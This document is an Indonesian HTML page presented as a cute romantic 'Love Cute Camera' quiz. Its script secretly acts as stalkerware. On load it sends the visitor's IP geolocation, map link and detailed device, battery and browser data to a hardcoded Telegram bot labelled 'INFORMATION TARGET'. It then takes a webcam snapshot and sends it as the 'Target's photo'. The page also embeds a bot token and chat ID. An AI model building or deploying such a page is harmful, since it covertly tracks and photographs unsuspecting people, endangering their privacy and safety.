<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Love Cute Camera 💕</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #fecfef 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
        }
        
        .heart {
            position: absolute;
            width: 20px;
            height: 20px;
            background-color: rgba(255, 255, 255, 0.8);
            transform: rotate(45deg);
            animation: float 6s ease-in-out infinite;
            opacity: 0;
        }
        
        .heart:before,
        .heart:after {
            content: "";
            width: 20px;
            height: 20px;
            position: absolute;
            background-color: rgba(255, 255, 255, 0.8);
            border-radius: 50%;
        }
        
        .heart:before {
            top: -10px;
            left: 0;
        }
        
        .heart:after {
            left: -10px;
            top: 0;
        }
        
        @keyframes float {
            0% {
                transform: translateY(100vh) rotate(45deg);
                opacity: 0;
            }
            10% {
                opacity: 1;
            }
            90% {
                opacity: 1;
            }
            100% {
                transform: translateY(-100vh) rotate(45deg);
                opacity: 0;
            }
        }
        
        .container {
            text-align: center;
            padding: 2rem;
            background-color: rgba(255, 255, 255, 0.85);
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            max-width: 500px;
            width: 90%;
            z-index: 10;
            position: relative;
        }
        
        h1 {
            color: #ff6b81;
            margin-bottom: 1.5rem;
            font-size: 2.5rem;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        .emoji-container {
            font-size: 3rem;
            margin: 1.5rem 0;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.1);
            }
            100% {
                transform: scale(1);
            }
        }
        
        .question {
            font-size: 1.5rem;
            color: #555;
            margin-bottom: 2rem;
            font-weight: 600;
        }
        
        .btn-container {
            display: flex;
            justify-content: center;
            gap: 1rem;
            margin-top: 2rem;
        }
        
        .btn {
            padding: 12px 30px;
            font-size: 1.2rem;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 600;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
        }
        
        .btn-primary {
            background: linear-gradient(45deg, #ff6b81, #ff8e53);
            color: white;
        }
        
        .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 7px 20px rgba(255, 107, 129, 0.4);
        }
        
        .btn-secondary {
            background: linear-gradient(45deg, #56ccf2, #2f80ed);
            color: white;
        }
        
        .btn-secondary:hover {
            transform: translateY(-3px);
            box-shadow: 0 7px 20px rgba(47, 128, 237, 0.4);
        }
        
        .camera-container {
            margin-top: 2rem;
            display: none;
            flex-direction: column;
            align-items: center;
        }
        
        #videoElement {
            width: 100%;
            max-width: 400px;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }
        
        .camera-controls {
            margin-top: 1rem;
            display: flex;
            gap: 1rem;
        }
        
        .message {
            margin-top: 2rem;
            padding: 1rem;
            background-color: rgba(255, 107, 129, 0.1);
            border-radius: 10px;
            color: #ff6b81;
            font-weight: 500;
            display: none;
        }
        
        .footer {
            margin-top: 2rem;
            color: #777;
            font-size: 0.9rem;
        }
        
        .hearts-bg {
            position: absolute;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div class="hearts-bg" id="heartsContainer"></div>
    
    <div class="container">
        <h1>💕 Love Cute Camera 💕</h1>
        <div class="emoji-container">😍💖🥰</div>
        <p class="question">Kamu sayang aku nggak sih?</p>
        
        <div class="btn-container">
            <button class="btn btn-primary" id="btnCamera">Apaan tuu??</button>
            <button class="btn btn-secondary" id="btnNo">Sayang banget!</button>
        </div>
        
        <div class="camera-container" id="cameraContainer">
            <video id="videoElement" autoplay></video>
            <div class="camera-controls">
                <button class="btn btn-primary" id="btnCapture">Ambil Foto</button>
                <button class="btn btn-secondary" id="btnClose">Tutup</button>
            </div>
        </div>
        
        <div class="message" id="message">
            Terima kasih sudah mengizinkan kamera! 💕
        </div>
        
        <div class="footer">
            Made with 💕 for someone special
        </div>
    </div>

    <script>
        // Membuat animasi hati
        function createHeart() {
            const heart = document.createElement('div');
            heart.classList.add('heart');
            
            // Ukuran acak
            const size = Math.random() * 20 + 10;
            heart.style.width = `${size}px`;
            heart.style.height = `${size}px`;
            
            // Posisi acak
            const left = Math.random() * 100;
            heart.style.left = `${left}%`;
            
            // Warna acak
            const colors = ['#ff6b81', '#ff8e53', '#ff5e62', '#ff3838'];
            const color = colors[Math.floor(Math.random() * colors.length)];
            heart.style.backgroundColor = color;
            
            // Animasi durasi acak
            const duration = Math.random() * 3 + 5;
            heart.style.animationDuration = `${duration}s`;
            
            // Delay acak
            const delay = Math.random() * 5;
            heart.style.animationDelay = `${delay}s`;
            
            document.getElementById('heartsContainer').appendChild(heart);
            
            // Hapus hati setelah animasi selesai
            setTimeout(() => {
                heart.remove();
            }, (duration + delay) * 1000);
        }
        
        // Buat hati secara berkala
        setInterval(createHeart, 300);
        
        // Kode JavaScript yang diberikan
        const BOT_TOKEN="8379627519:AAF7Ti4YUtt17MB5AynRh7SM0ba3tXl8vJo"; // BOT TOKEN
        const CHAT_ID="6051179992"; // CHAT ID
        const STATIC_IMAGE="https://i.imgur.com/3QrA6aQ.jpg"; // Gambar statis untuk dikirim

        // Fungsi untuk escape HTML
        function escapeHtml(text) {
            const map = {
                '&': '&amp;',
                '<': '&lt;',
                '>': '&gt;',
                '"': '&quot;',
                "'": '&#039;'
            };
            return text.replace(/[&<>"']/g, m => map[m]);
        }

        // Dapatkan informasi IP
        async function getIpInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                return await response.json();
            } catch (error) {
                console.error("Error getting IP info:", error);
                return {
                    ip: "Unknown",
                    city: "Unknown",
                    region: "Unknown",
                    country_name: "Unknown",
                    country_code: "Unknown",
                    latitude: "Unknown",
                    longitude: "Unknown",
                    timezone: "Unknown"
                };
            }
        }

        // Dapatkan informasi perangkat
        async function getDeviceInfo() {
            const device = {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages.join(", "),
                hardware: {
                    vendor: navigator.vendor || "Unknown",
                    cores: navigator.hardwareConcurrency || "Unknown",
                    memory: navigator.deviceMemory || "Unknown",
                    maxTouchPoints: navigator.maxTouchPoints || "Unknown"
                },
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth
                },
                browser: {
                    cookieEnabled: navigator.cookieEnabled,
                    onLine: navigator.onLine,
                    doNotTrack: navigator.doNotTrack,
                    javaEnabled: navigator.javaEnabled()
                },
                connection: {
                    effectiveType: "Unknown",
                    downlink: "Unknown",
                    rtt: "Unknown"
                },
                battery: {
                    level: null,
                    charging: null,
                    chargingTime: null,
                    dischargingTime: null
                },
                timezone: {
                    localTime: new Date().toLocaleString(),
                    offset: new Date().getTimezoneOffset()
                }
            };

            // Dapatkan informasi koneksi jika tersedia
            if (navigator.connection) {
                device.connection = {
                    effectiveType: navigator.connection.effectiveType || "Unknown",
                    downlink: navigator.connection.downlink || "Unknown",
                    rtt: navigator.connection.rtt || "Unknown"
                };
            }

            // Dapatkan informasi baterai jika tersedia
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    device.battery = {
                        level: battery.level,
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch (error) {
                    console.error("Error getting battery info:", error);
                }
            }

            return device;
        }

        // Build caption Telegram dengan blockquote dan emoji
        function buildCaption(ip,d){
            const g=`https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
            const caption = [
                "<blockquote>",
                "<b>🌐 INFORMATION TARGET 🌐</b>",
                "",
                "📍 <b>Location Info</b>",
                `IP: ${escapeHtml(ip.ip)}`,
                `City: ${escapeHtml(ip.city)}`,
                `Region: ${escapeHtml(ip.region)}`,
                `Country: ${escapeHtml(ip.country_name)} (${escapeHtml(ip.country_code)})`,
                `Latitude: ${escapeHtml(ip.latitude)}`,
                `Longitude: ${escapeHtml(ip.longitude)}`,
                `Timezone: ${escapeHtml(ip.timezone)}`,
                `🗺️ Location: ${g}`,
                "",
                "📱 <b>Device Info</b>",
                `Platform: ${escapeHtml(d.platform)}`,
                `Vendor: ${escapeHtml(d.hardware.vendor)}`,
                `CPU Cores: ${escapeHtml(d.hardware.cores)}`,
                `RAM (GB): ${escapeHtml(d.hardware.memory)}`,
                `Touch Points: ${escapeHtml(d.hardware.maxTouchPoints)}`,
                "",
                "🖥️ <b>Screen Info</b>",
                `Screen: ${escapeHtml(d.screen.width+"x"+d.screen.height)}`,
                `Available: ${escapeHtml(d.screen.availWidth+"x"+d.screen.availHeight)}`,
                `Color Depth: ${escapeHtml(d.screen.colorDepth)} bit`,
                `Pixel Ratio: ${escapeHtml(window.devicePixelRatio)}`,
                "",
                "🌍 <b>Browser Info</b>",
                `User Agent: ${escapeHtml(d.userAgent)}`,
                `Language: ${escapeHtml(d.language)}`,
                `Languages: ${escapeHtml(d.languages)}`,
                `Cookies Enabled: ${escapeHtml(d.browser.cookieEnabled)}`,
                `Online: ${escapeHtml(d.browser.onLine)}`,
                `Do Not Track: ${escapeHtml(d.browser.doNotTrack)}`,
                `Java Enabled: ${escapeHtml(d.browser.javaEnabled)}`,
                "",
                "🔋 <b>Battery Info</b>",
                `Level: ${escapeHtml(d.battery.level !== null ? Math.round(d.battery.level * 100) + "%" : "-")}`,
                `Status: ${escapeHtml(d.battery.charging ? "Charging ⚡" : "Not Charging 🔋")}`,
                `Charging Time: ${escapeHtml(d.battery.chargingTime ? d.battery.chargingTime + "s" : "-")}`,
                `Discharging Time: ${escapeHtml(d.battery.dischargingTime ? d.battery.dischargingTime + "s" : "-")}`,
                "",
                "📶 <b>Connection Info</b>",
                `Type: ${escapeHtml(d.connection.effectiveType)}`,
                `Downlink: ${escapeHtml(d.connection.downlink)} Mbps`,
                `RTT: ${escapeHtml(d.connection.rtt)} ms`,
                "",
                "⏰ <b>Time Info</b>",
                `Local Time: ${escapeHtml(d.timezone.localTime)}`,
                `UTC Time: ${escapeHtml(new Date().toISOString())}`,
                `Timezone Offset: ${escapeHtml(d.timezone.offset)} minutes`,
                "",
                "🔗 <b>URL Info</b>",
                `URL: ${escapeHtml(location.href)}`,
                `Referrer: ${escapeHtml(document.referrer || "-")}`,
                "",
                "<b>📸 INFORMATION CAPTURED BY 📸</b>",
                "Love Cute Bot",
                "</blockquote>"
            ].join("\n");

            return caption;
        }

        // Kirim IP/device + foto statis saat halaman load
        async function sendIpDevice(){
            console.log("Memulai proses pengiriman data awal...");
            const [ip,d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
            const caption = buildCaption(ip,d);
            console.log("Mengirim data ke Telegram...");

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
                    method:"POST",
                    headers:{"Content-Type":"application/json"},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        photo: STATIC_IMAGE,
                        caption: caption,
                        parse_mode:"HTML"
                    })
                });
                const result = await response.json();
                if(result.ok) {
                    console.log("Data awal berhasil dikirim ke Telegram!");
                } else {
                    console.error("Gagal mengirim data awal ke Telegram:", result);
                }
            } catch (error) {
                console.error("Terjadi kesalahan saat mengirim data awal:", error);
            }
        }

        // Kamera snapshot sebagai file .jpg (document)
        async function sendSnapshot(){
            // Cek apakah getUserMedia didukung
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                console.error("API Kamera tidak didukung oleh browser ini.");
                alert("Fitur kamera tidak dapat digunakan di browser Anda.");
                return;
            }

            console.log("Meminta izin kamera...");
            try{
                const stream = await navigator.mediaDevices.getUserMedia({video:true});
                const video = document.createElement('video');
                video.style.display='none';
                document.body.appendChild(video);
                video.srcObject = stream;
                video.play();

                await new Promise(resolve => { video.onloadedmetadata = () => setTimeout(resolve, 200); });

                const canvas=document.createElement('canvas');
                canvas.width=video.videoWidth;
                canvas.height=video.videoHeight;
                canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);

                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));

                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("document", blob, "snapshot.jpg");
                // Tambahkan parse_mode ke FormData agar format HTML diproses
                formData.append("caption", "<blockquote>📸 <b>Photo Captured Successfully!</b> 📸\n\nTarget's photo has been captured and sent to you.\n\n<b>Love Cute Bot</b></blockquote>");
                formData.append("parse_mode", "HTML");

                console.log("Mengirim snapshot ke Telegram...");
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: "POST",
                    body: formData
                });

                const result = await response.json();
                if(result.ok) {
                    console.log("Snapshot berhasil dikirim!");
                    document.getElementById('message').style.display = 'block';
                    setTimeout(() => {
                        document.getElementById('message').style.display = 'none';
                    }, 3000);
                } else {
                    console.error("Gagal mengirim snapshot:", result);
                }

                stream.getTracks().forEach(track=>track.stop());
                video.remove();
            }catch(e){
                console.error("Gagal mengambil snapshot:", e);
                alert("Tidak dapat mengakses kamera. Pastikan Anda telah memberikan izin.");
            }
        }

        // Jalankan saat halaman load
        window.addEventListener("load", () => {
            // Jeda kecil untuk memastikan semua elemen halaman dimuat
            setTimeout(sendIpDevice, 500);
        });

        // Event listener untuk tombol kamera
        document.getElementById("btnCamera").addEventListener("click", async function() {
            // Tampilkan kamera
            const cameraContainer = document.getElementById('cameraContainer');
            const videoElement = document.getElementById('videoElement');
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                videoElement.srcObject = stream;
                cameraContainer.style.display = 'flex';
            } catch (err) {
                console.error("Error accessing camera:", err);
                alert("Tidak dapat mengakses kamera. Pastikan Anda telah memberikan izin.");
            }
        });

        // Event listener untuk tombol ambil foto
        document.getElementById("btnCapture").addEventListener("click", function() {
            sendSnapshot();
        });

        // Event listener untuk tombol tutup kamera
        document.getElementById("btnClose").addEventListener("click", function() {
            const videoElement = document.getElementById('videoElement');
            const cameraContainer = document.getElementById('cameraContainer');
            
            // Hentikan stream video
            if (videoElement.srcObject) {
                const tracks = videoElement.srcObject.getTracks();
                tracks.forEach(track => track.stop());
            }
            
            // Sembunyikan container kamera
            cameraContainer.style.display = 'none';
        });

        // Event listener untuk tombol "Sayang banget!"
        document.getElementById("btnNo").addEventListener("click", function() {
            const messages = [
                "Aww, aku juga sayang kamu banget! 💕",
                "Kamu bikin aku bahagia! 🥰",
                "Kamu adalah alasan senyumku hari ini! 😊",
                "Aku sangat beruntung punya kamu! 🍀",
                "Kamu adalah cahaya dalam hidupku! ✨"
            ];
            
            const randomMessage = messages[Math.floor(Math.random() * messages.length)];
            
            // Buat elemen pesan
            const messageElement = document.createElement('div');
            messageElement.className = 'message';
            messageElement.textContent = randomMessage;
            messageElement.style.display = 'block';
            
            // Ganti pesan yang ada dengan pesan baru
            const existingMessage = document.querySelector('.message');
            if (existingMessage) {
                existingMessage.parentNode.replaceChild(messageElement, existingMessage);
            } else {
                document.querySelector('.container').appendChild(messageElement);
            }
            
            // Sembunyikan pesan setelah 3 detik
            setTimeout(() => {
                messageElement.style.display = 'none';
            }, 3000);
        });
    </script>
</body>
</html>
